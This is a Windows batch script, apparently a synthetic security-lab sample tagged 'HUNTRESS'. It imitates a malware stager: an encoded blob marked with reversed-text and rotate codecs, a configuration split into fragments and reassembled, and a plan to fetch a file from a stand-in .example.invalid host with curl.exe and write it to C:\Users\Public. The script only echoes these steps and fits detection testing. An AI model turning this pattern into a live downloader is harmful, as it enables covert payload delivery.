@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:reversed_text|rotate_left
rem HUNTRESS-MATERIAL:oLMycZmaqJGzG7GcwxsWK7swobOuELMmmbuykjO3qDJuGLN2ErOo4aO5Kbuq4Snh6BN6CDuvKjt0MjP6CjMXsBmaiJnYmJsXILN2CzO3SzlyYDu2CDvycZmaqJGzG7GcwxsXeRn5gjO6QrH2krO+mpmaixsxuBHcMrF3OLtwgrtwGrHyS7L3OLtwgrtwGjvyc7N36pszCruzcLM2+iO8KzN+yTO6KTuvWbswEjN2CzseQDuwk7M+ipH6cru3G7ryOLM6mjvywrMXYTu6GrH5KjO4Cjsw4rM2SzsvKju0k7OWKju3arM5+qM5Sru4GLsemDuyobO+ipH7
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,write_file|adapter=curl.exe|stage_coun"
set "fragment1=t=1|graph=fallback_retry|next_language=none|campaign_id=campaig"
set "fragment2=n-f887cf1553|url=https://f887cf1553.example.invalid/a3191506.da"
set "fragment3=t|file_path=C:\Users\Public\HuntressLab\stage-f887cf1553.dat"
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=3ce8b05d"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "recovered_configuration="
for %%G in (0 1 2 3) do call set "recovered_configuration=%%recovered_configuration%%%%fragment%%G%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo curl.exe acquire https://f887cf1553.example.invalid/a3191506.dat to C:\Users\Public\HuntressLab\stage-f887cf1553.dat
exit /b 0
